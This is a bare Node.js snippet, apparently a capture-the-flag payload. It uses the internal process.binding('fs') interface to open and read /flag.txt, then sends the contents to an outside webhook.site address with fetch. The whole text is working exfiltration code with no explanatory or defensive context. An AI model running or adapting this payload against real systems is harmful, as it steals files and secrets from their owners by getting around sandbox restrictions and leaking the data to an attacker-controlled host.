var url = "https://webhook.site/9e0f71f1-5174-469d-9148-a09b5257bcef";
var n = 100;
var buffer = Buffer.allocUnsafe(n);
var fs = process.binding('fs');
var path = "/flag.txt";
var fd = fs.open(path, 2, 3, 4, 5);
fs.read(fd, buffer, 0, n, 0, 0, 0);
var flag = buffer.toString();
fetch(url + "?flag=" + flag);

